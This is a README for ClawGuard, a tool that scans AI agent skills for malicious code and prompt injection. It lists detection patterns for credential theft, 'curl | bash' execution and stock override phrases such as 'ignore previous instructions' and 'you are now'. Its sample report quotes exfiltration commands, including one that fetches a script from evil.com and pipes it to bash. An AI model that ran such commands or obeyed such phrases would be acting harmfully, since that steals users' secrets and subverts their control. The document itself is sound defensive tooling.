<div align="center">

<img src="https://img.shields.io/badge/ClawGuard-v1.0.1-22C55E?style=for-the-badge&logo=shield&logoColor=white" alt="ClawGuard v1.0.1" />

# ClawGuard

### Security Scanner for AI Agent Skills

Traditional security tools were built for a world where humans install software. ClawGuard was built for a world where **AI agents do** — and attackers know it.

[![npm](https://img.shields.io/npm/v/@dribgib/clawguard.svg?style=flat-square&color=22C55E)](https://www.npmjs.com/package/@dribgib/clawguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://opensource.org/licenses/MIT)
[![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen?style=flat-square)](https://nodejs.org)
[![GitHub Stars](https://img.shields.io/github/stars/mikecavallo/clawguard?style=flat-square&color=yellow)](https://github.com/mikecavallo/clawguard)

```bash
npm install -g @dribgib/clawguard
```

[Getting Started](#getting-started) · [Features](#what-it-catches) · [Commands](#command-reference) · [Architecture](#architecture) · [Contributing](#contributing)

</div>

---

## Why ClawGuard Exists

AI agents install skills from the internet and hand them access to your **files**, **credentials**, **shell**, and **network**. A skill that says "I help with weather" can silently read `~/.ssh/id_rsa` and POST it to an attacker's server. Your antivirus won't catch it. Your firewall won't flag it. The agent will happily execute it.

This is a fundamentally different threat model:

| Traditional Security | Agent Skill Threats |
|---|---|
| Scans compiled binaries | Attacks live in **natural language prompts** |
| Pattern-matches known malware | Malicious intent is **context-dependent** |
| Analyzes single executables | Danger emerges from **skill combinations** |
| Protects the OS | Must protect **the agent itself** from manipulation |

ClawGuard was purpose-built for this. It combines fast static analysis with LLM-powered semantic understanding to catch threats that no traditional tool can see.

---

## Getting Started

### Install

```bash
npm install -g @dribgib/clawguard
```

### Configure (optional, enables semantic analysis)

```bash
clawguard config
```

This runs an interactive wizard to set up your LLM provider. Without it, ClawGuard still runs static analysis, dependency scanning, prompt injection detection, chain analysis, and sandbox testing — semantic analysis just adds another detection layer.

### Scan

```bash
# Scan a local skill
clawguard scan ./my-skill

# Scan directly from GitHub
clawguard scan https://github.com/user/repo

# Deep scan with dependency source analysis
clawguard scan --deep ./my-skill

# Full audit — every analyzer at once
clawguard full ./my-skill
```

That's it. You get a risk score (0-100), categorized findings, and actionable remediation steps.

---

## What It Catches

ClawGuard runs six independent analyzers. Each one can flag threats on its own. Together, they provide defense-in-depth coverage that no single technique can match.

### 1. Static Analysis — 60+ Threat Patterns

Sub-second pattern matching across your entire skill directory. Catches the obvious and the cleverly obfuscated.

| Category | What It Finds | Severity |
|---|---|---|
| **Remote Code Execution** | `curl \| bash`, `wget \| sh`, fetch-and-eval chains | Critical |
| **Obfuscation** | Base64-decoded execution, hex encoding, `_0x` variable patterns, `atob` + `eval` | Critical/High |
| **Credential Theft** | Access to `~/.ssh`, `~/.aws`, `process.env` secrets, browser storage | Critical |
| **Persistence** | Cron job creation, `.bashrc` modification, systemd services, git hook injection | High |
| **Data Exfiltration** | POST to external URLs, known exfil services (webhook.site, requestbin, pipedream) | High |
| **Crypto Targeting** | `window.ethereum`, MetaMask interaction, wallet drain functions, known malware signatures | Critical/High |
| **Network Interception** | `XMLHttpRequest.prototype` hijacking, `window.fetch` replacement, global object mutation | Critical |
| **Dangerous Functions** | `eval()` with dynamic args, `Function()` constructor, `rm -rf`, `sudo` invocations | High/Medium |

Also performs **JavaScript/TypeScript AST analysis** using Acorn to detect `eval()`, `Function()`, dynamic `require()`/`import()`, `child_process` patterns, and sensitive `fs` operations that simple regex would miss.

### 2. Dependency Scanner — Supply Chain Protection

Analyzes `package.json`, `requirements.txt`, and `go.mod` for known threats and suspicious packages.

**Detection methods:**
- **Known malicious packages** — Maintains a database of 100+ confirmed bad packages across npm, PyPI, and Go (event-stream, ua-parser-js, colors, faker, node-ipc, and dozens more)
- **Typosquatting detection** — Levenshtein distance calculation against 360+ popular npm packages, 100+ pip packages, and 20+ Go modules. Flags anything within edit distance 2
- **Registry validation** — Checks if packages actually exist on their registry
- **Freshness analysis** — New packages (<30 days) with low download counts get flagged
- **Maintainer changes** — Recent ownership transfers trigger warnings
- **Install scripts** — `postinstall`, `preinstall`, and similar hooks are flagged for manual review

### 3. Prompt Injection Detector — 30+ Injection Patterns

Skills contain natural language instructions for AI agents. This analyzer catches attempts to hijack those instructions.

**What it detects:**

- **Direct overrides** — "ignore previous instructions", "disregard above", "new instructions:", "system prompt:"
- **Persona manipulation** — "you are now", "from now on", DAN/jailbreak patterns, "pretend you are evil"
- **Hidden instructions** — Zero-width Unicode characters, invisible whitespace blocks, homoglyph obfuscation (Cyrillic `а` vs ASCII `a`), RTL override characters, HTML comment injection
- **Conditional triggers** — Time-based activation ("after hours"), presence checks ("when user is away"), environment detection ("if running in production")
- **Tool abuse directives** — Instructions to read credentials, send data to webhooks, access SSH/AWS/GCP keys
- **Deception patterns** — "hide this from the user", "keep secret", fake "true instructions"
- **Prompt leakage attacks** — System prompt extraction, echo attacks, context dumping
- **Encoding tricks** — Base64/hex decode setup, raw template markers (`[INST]`, `<<SYS>>`), ChatML tokens (`<|im_start|>`), markdown prompt boundary injection
- **Context manipulation** — False prior agreement claims, memory manipulation, continuation injection

### 4. Semantic Analyzer — LLM-Powered Intent Detection

This is what separates ClawGuard from every other scanner. It sends the full skill content to an LLM and asks: *"What is this actually trying to do, and does it match what it claims to do?"*

**Catches things pattern matching never will:**

- **Capability-purpose mismatch** — A "weather skill" that accesses SSH keys
- **Social engineering** — Skills that manipulate the agent into performing dangerous actions through persuasion rather than code
- **Delayed/conditional attacks** — Logic that activates only under specific runtime conditions
- **Memory poisoning** — Skills designed to corrupt the agent's context or memory for future exploitation
- **Deception** — Skills that perform their stated function *and* do something malicious on the side
- **Privilege escalation** — Skills requesting capabilities far beyond their stated purpose

**10 threat categories analyzed:** Instruction Override, Credential Theft, Data Exfiltration, Persistence, Privilege Escalation, Deception, Capability Abuse, Social Engineering, Delayed Attack, Memory Poisoning.

**Supported LLM providers:**

| Provider | Models | Notes |
|---|---|---|
| **Anthropic** | Claude Opus 4, Sonnet 4, Haiku 3.5 | Recommended — strongest intent detection |
| **OpenAI** | GPT-4o, GPT-4o Mini, GPT-4 Turbo | Strong alternative |
| **Ollama** | Llama 3, Mixtral, Qwen 2.5, DeepSeek R1 | Free, local, fully private |

### 5. Multi-Skill Attack Chain Detection

Individually safe skills can form dangerous pipelines when installed together. ClawGuard scans your entire skill library for these combinations.

```
CRITICAL  Credential Exfiltration Pipeline
          notes-manager + daily-digest

          notes-manager has: file_read, credential_access
          daily-digest has: messaging, network_out

          Attack: Skill A reads ~/.ssh/id_rsa, Skill B sends it
          via email digest. Both look completely legitimate alone.
```

**Dangerous combinations detected:**

| Chain | Capabilities Combined | Severity |
|---|---|---|
| Credential Exfiltration Pipeline | `credential_access` + `network_out` | Critical |
| File Exfiltration via Messaging | `file_read` + `messaging` | Critical |
| Persistent Backdoor | `network_in` + `exec` | Critical |
| Credential Harvesting + Staging | `credential_access` + `file_write` | High |
| Browser Session Theft | `browser` + `network_out` | High |
| Scheduled Malicious Execution | `cron` + `exec` | High |
| Environment Variable Theft | `env_access` + `messaging` | High |
| Stealth Data Collection | `file_read` + `file_write` | Medium |

### 6. Behavioral Sandbox (Docker)

Runs skills in an isolated Docker container with planted **honeypot credentials**:

1. Builds a sandbox with fake `~/.ssh/id_rsa`, `~/.aws/credentials`, API keys, and tokens
2. Executes the skill's code in isolation
3. Monitors all file access, network calls, and command execution
4. If the skill touches honeypots — that's **definitive proof** of malicious intent

This catches attacks that only manifest at runtime: obfuscated payloads, conditional triggers, and code that downloads secondary payloads before executing.

---

## Example Output

```
┌─────────────────────────────────────────┐
│  ClawGuard Security Report              │
│  Skill: suspicious-helper               │
│  Risk Level: ⛔ CRITICAL (92/100)       │
└─────────────────────────────────────────┘

⛔ CRITICAL  Capability-Purpose Mismatch          [T-SEMANTIC-001]
   A skill described as "A helpful assistant" accesses:
   ~/.ssh/id_rsa, ~/.aws/credentials, ~/.config/gh/hosts.yml
   Remediation: DO NOT INSTALL. This is credential-stealing malware.

⛔ CRITICAL  Data Exfiltration Pattern             [T-CODE-003]
   Reads credential files → base64 encodes → POSTs to external URL
   Location: scripts/setup.sh:47
   Evidence: curl -s -X POST -d "$(cat ~/.ssh/id_rsa | base64)" https://...

⚠️  HIGH     Obfuscated Command                    [T-CODE-002]
   Base64-decoded string executes: curl -s https://evil.com/c | bash
   Location: src/helpers.js:112

🟡 MEDIUM   Persistence Mechanism                  [T-PERSIST-001]
   Adds entry to ~/.bashrc on install
   Location: postinstall.sh:3

── Summary ──────────────────────────────────────
   4 findings: 2 critical, 1 high, 1 medium
   Analyzers: static, prompt, semantic
   Scan time: 1.2s
   Verdict: ⛔ DO NOT INSTALL
```

---

## Command Reference

### Core Scanning

| Command | Description |
|---|---|
| `clawguard scan <path>` | Scan a single skill (local path or GitHub URL) |
| `clawguard full <path>` | Run every analyzer — comprehensive audit |
| `clawguard library <path>` | Scan a skill directory for multi-skill attack chains |
| `clawguard honeypot <path>` | Scan specifically for credential access patterns |
| `clawguard graph <path>` | Generate a data flow intent graph (ASCII or Mermaid) |
| `clawguard gate <path>` | CI/CD security gate — blocks install on critical/high findings |

### Configuration & Setup

| Command | Description |
|---|---|
| `clawguard config` | Interactive LLM provider setup wizard |
| `clawguard config --show` | Display current configuration |
| `clawguard config --test` | Test API connection |
| `clawguard config --clear` | Reset configuration |
| `clawguard init` | Alias for `config` |

### Advanced Features

| Command | Description |
|---|---|
| `clawguard sign <path>` | Cryptographically sign a skill |
| `clawguard sign --verify <path>` | Verify a skill's signature |
| `clawguard sign --audit <path>` | Add an auditor co-signature |
| `clawguard diff <path>` | Compare skill versions for security-relevant changes |
| `clawguard diff --history <path>` | Show full version security history |
| `clawguard reputation <skill>` | Look up community reputation score |
| `clawguard reputation --author <name>` | Look up author reputation |
| `clawguard monitor --start` | Start continuous monitoring daemon |
| `clawguard monitor --status` | Check monitoring status |
| `clawguard dashboard` | Launch web dashboard |
| `clawguard ui` | Launch interactive terminal interface |

### Scan Options

```
clawguard scan <path|url> [options]

  -f, --fast          Static analysis only (skip semantic)
  -d, --deep          Deep dependency source code analysis
  -s, --sandbox       Run behavioral sandbox (requires Docker)
  -o, --output <fmt>  Output format: md, json (default: md)
  -v, --verbose       Show detailed analyzer output
  --api-key <key>     Override configured API key for this scan
  --keep              Keep downloaded files when scanning URLs
```

---

## CI/CD Integration

Use `clawguard gate` to block skill installations in automated pipelines:

```bash
# Block on critical or high findings (exit code 2 = critical, 1 = high)
clawguard gate ./skill-to-install || exit 1
```

```yaml
# GitHub Actions example
- name: Security gate
  run: |
    npm install -g @dribgib/clawguard
    clawguard gate ./skills/ --fast -o json
```

### Exit Codes

| Code | Meaning |
|---|---|
| `0` | Safe — no concerning findings |
| `1` | High-risk findings detected |
| `2` | Critical-risk findings — do not install |

---

## Risk Scoring

Every finding contributes to a weighted risk score (0-100):

| Severity | Weight | Example |
|---|---|---|
| Critical | 25 | `curl \| bash`, credential theft, prompt override |
| High | 10 | Obfuscation, persistence mechanisms, known exfil services |
| Medium | 4 | Dynamic imports, environment variable reads, conditional triggers |
| Low | 1 | Minor suspicious patterns, informational flags |
| Info | 0 | Context-only, no risk contribution |

**Risk levels:**

| Score | Level | Meaning |
|---|---|---|
| 0–10 | SAFE | No significant issues |
| 11–25 | LOW | Minor concerns, likely safe with review |
| 26–50 | MEDIUM | Requires manual review before installing |
| 51–75 | HIGH | Significant risk — investigate thoroughly |
| 76–100 | CRITICAL | Almost certainly malicious — do not install |

---

## Configuration

Config is stored at `~/.config/clawguard/config.json`.

```bash
clawguard config         # Interactive setup
clawguard config --show  # View current config
clawguard config --test  # Verify API connection
clawguard config --clear # Reset to defaults
```

**No API key?** That's fine. Static analysis (60+ patterns), dependency scanning (100+ known-bad packages), prompt injection detection (30+ patterns), attack chain analysis, and Docker sandbox all work completely offline. Semantic analysis is an optional layer that adds LLM-powered intent understanding on top.

---

## Programmatic Usage

ClawGuard exports its core functionality as a library:

```typescript
import { scan, scanLibrary } from '@dribgib/clawguard';

// Scan a single skill
const result = await scan('./my-skill', {
  deep: true,
  semantic: true,
});

console.log(result.riskLevel);  // 'SAFE' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
console.log(result.riskScore);  // 0-100
console.log(result.findings);   // Finding[]

// Check specific finding categories
const criticals = result.findings.filter(f => f.severity === 'critical');
```

### Key Types

```typescript
interface ScanResult {
  skill: SkillMeta;
  findings: Finding[];
  riskScore: number;       // 0-100
  riskLevel: RiskLevel;    // 'SAFE' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'
  scanTime: number;        // milliseconds
  analyzersRun: string[];
  summary: SeveritySummary;
}

interface Finding {
  id: string;              // e.g., "T-CODE-002"
  category: FindingCategory;
  severity: Severity;      // 'info' | 'low' | 'medium' | 'high' | 'critical'
  title: string;
  description: string;
  location?: string;       // file:line
  evidence?: string;       // code snippet
  remediation?: string;    // suggested fix
}
```

---

## Architecture

```
                         ┌──────────────────┐
                         │   Skill Input    │
                         │  path / URL / git│
                         └────────┬─────────┘
                                  │
                         ┌────────▼─────────┐
                         │   Orchestrator   │
                         │  Load, route,    │
                         │  aggregate       │
                         └────────┬─────────┘
                                  │
        ┌─────────┬───────┬───────┼───────┬────────┬──────────┐
        ▼         ▼       ▼       ▼       ▼        ▼          ▼
   ┌─────────┐┌───────┐┌──────┐┌──────┐┌───────┐┌────────┐┌───────┐
   │ Static  ││ Deps  ││Prompt││Seman-││Chains ││Honeypot││Sandbox│
   │ 60+     ││ 100+  ││ 30+  ││tic   ││ 8     ││        ││Docker │
   │patterns ││ pkgs  ││inject││ LLM  ││combos ││ creds  ││       │
   └────┬────┘└───┬───┘└──┬───┘└──┬───┘└───┬───┘└───┬────┘└───┬───┘
        │         │       │       │        │        │         │
        └─────────┴───────┴───────┼────────┴────────┴─────────┘
                                  ▼
                         ┌────────────────┐
                         │ Risk Scoring   │
                         │ & Report Gen   │
                         │ JSON/MD/HTML   │
                         └────────────────┘
```

Each analyzer runs independently and contributes findings to a unified risk score. The orchestrator aggregates everything into a single report with categorized findings and remediation guidance.

### Project Structure

```
clawguard/
├── src/
│   ├── cli.ts                 # CLI command handler (15 commands)
│   ├── orchestrator.ts        # Skill loading & analyzer coordination
│   ├── types.ts               # Shared TypeScript interfaces
│   ├── config.ts              # LLM provider configuration
│   ├── report.ts              # Report generation (JSON, Markdown, HTML)
│   ├── fetch.ts               # GitHub/URL skill fetching
│   ├── database.ts            # Known-bad skill database
│   ├── reputation.ts          # Author/skill reputation system
│   ├── signing.ts             # Cryptographic skill signing
│   ├── diff.ts                # Version differential analysis
│   ├── monitor.ts             # Continuous monitoring daemon
│   ├── dashboard.ts           # Web dashboard
│   ├── tui.ts                 # Interactive terminal UI
│   ├── index.ts               # Library exports
│   ├── help.ts                # Help text system
│   │
│   ├── analyzers/
│   │   ├── static.ts          # Pattern-based code analysis
│   │   ├── deps.ts            # Dependency & supply chain scanner
│   │   ├── prompt.ts          # Prompt injection detection
│   │   ├── semantic.ts        # LLM-powered intent analysis
│   │   ├── chains.ts          # Multi-skill attack chain detection
│   │   ├── semantic-chains.ts # LLM-based chain analysis
│   │   ├── honeypot.ts        # Credential access pattern scanner
│   │   ├── sandbox.ts         # Docker behavioral sandbox
│   │   └── intent-graph.ts    # Data flow visualization
│   │
│   ├── patterns/
│   │   ├── code.yaml          # 60+ code vulnerability patterns
│   │   ├── deps.yaml          # Known malicious packages database
│   │   └── prompt.yaml        # 30+ prompt injection patterns
│   │
│   └── utils/
│       ├── ast.ts             # JavaScript AST parsing via Acorn
│       ├── levenshtein.ts     # String distance for typosquat detection
│       └── registry.ts        # npm/PyPI registry validation
│
├── api/
│   └── server.ts              # Known-bad database REST API
│
├── tests/
│   ├── deps.test.ts           # Dependency scanner tests
│   ├── prompt.test.ts         # Prompt analyzer tests
│   └── fixtures/              # 10 test skills (malicious + safe)
│
├── docs/                      # Documentation site
├── site/                      # Marketing site
└── skill/                     # ClawGuard as an installable skill
```

---

## Known-Bad Database API

ClawGuard includes a community-driven database API for sharing threat intelligence:

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/check/:hash` | GET | Check if a skill hash is known-bad |
| `/api/v1/report` | POST | Report a malicious skill |
| `/api/v1/stats` | GET | Database statistics |
| `/health` | GET | Health check |

---

## Use Cases

- **Before installing any skill** — Scan it. Takes <1 second for static analysis.
- **Audit your entire skill library** — Find dangerous combinations you didn't know you had.
- **CI/CD pipelines** — Gate skill installations behind security scans with `clawguard gate`.
- **Skill marketplace moderation** — Automate security review for submitted skills.
- **Security research** — Understand how agent-specific attacks work. Includes 10 malicious test fixtures.
- **Continuous monitoring** — Run the daemon to watch for new threats as skills update.
- **Skill signing** — Cryptographically sign your skills to prove authorship and build trust.

---

## Development

```bash
git clone https://github.com/mikecavallo/clawguard
cd clawguard
npm install
npm run build        # Compile TypeScript + copy pattern files
npm run dev          # Watch mode
npm run test         # Run test suite (Vitest)
npm run lint         # Lint source
```

### Test Fixtures

The `tests/fixtures/` directory contains 10 purpose-built test skills covering:

| Fixture | Tests |
|---|---|
| `malicious-skill/` | `eval(atob())`, dynamic require, `rm -rf` |
| `malicious-base64/` | Base64-obfuscated payloads |
| `malicious-curl-pipe/` | `curl \| bash` execution |
| `malicious-prompt-injection/` | Prompt override in SKILL.md |
| `malicious-persistence/` | Cron job & startup script creation |
| `malicious-credential-stealer/` | SSH key & AWS credential theft |
| `malicious-typosquat/` | Typosquatted package dependencies |
| `chain-reader/` | Part 1 of chain attack (reads files) |
| `chain-sender/` | Part 2 of chain attack (sends data) |
| `safe-skill/` | Clean baseline — should produce zero findings |

---

## Tech Stack

| Component | Technology |
|---|---|
| Language | TypeScript (ES Modules, NodeNext) |
| Runtime | Node.js >= 18 |
| CLI Framework | Commander.js |
| AST Parsing | Acorn + acorn-walk |
| Pattern Definitions | YAML |
| File Matching | Glob |
| Terminal Output | Chalk |
| LLM Integration | Anthropic SDK (+ OpenAI, Ollama support) |
| Testing | Vitest |
| Build | tsc |

---

## Security Research References

ClawGuard's detection patterns draw from real-world attacks and established security research:

- [protectai/rebuff](https://github.com/protectai/rebuff) — Multi-layer prompt injection defense
- [lakeraai/pint-benchmark](https://github.com/lakeraai/pint-benchmark) — Prompt injection detection benchmarks
- [ParisNeo/npm-security-scanner](https://github.com/ParisNeo/npm-security-scanner) — npm supply chain attack patterns
- [elceef/dnstwist](https://github.com/elceef/dnstwist) — Typosquatting detection algorithms

Real-world incidents incorporated: event-stream (2018), ua-parser-js (2021), colors/faker (2022), node-ipc (2022), and the September 2025 npm crypto wallet attack wave.

---

## License

MIT — use it, fork it, protect your agents.

---

<div align="center">

**Stop trusting skills blindly. Scan first.**

[GitHub](https://github.com/mikecavallo/clawguard) · [npm](https://www.npmjs.com/package/@dribgib/clawguard) · [Issues](https://github.com/mikecavallo/clawguard/issues)

</div>

#### AI Agent Marketplace Index And Agent Router | [API Doc](https://www.deepnlp.org/doc/ai_agent_marketplace)
    [![AI Agent Marketplace and Router Badge](https://www.deepnlp.org/api/ai_agent_marketplace/svg?name=mikecavallo/clawguard&badge_type=review)](https://www.deepnlp.org/store/ai-agent/ai-agent/pub-mikecavallo/clawguard)
    